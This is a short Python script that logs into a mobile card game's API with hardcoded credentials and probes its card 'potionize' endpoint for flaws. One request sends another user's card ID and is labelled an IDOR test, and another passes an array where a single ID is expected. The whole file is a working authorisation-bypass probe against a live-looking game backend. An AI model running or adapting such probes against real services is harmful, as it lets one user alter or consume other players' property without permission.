import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    print("Testing Potionize...")
    
    cards = d1.get("data", {}).get("cards", [])
    if not cards: return
    card_id = cards[0]["id"]
    
    print("\n[+] Potionize other user card")
    res = c1.post("/cards/potionize", {"card_id": 700127207})
    print("Potionize IDOR:", res)
    time.sleep(1)
    
    print("\n[+] Potionize array")
    res = c1.post("/cards/potionize", {"card_id": [card_id]})
    print("Potionize array:", res)

if __name__ == "__main__":
    main()
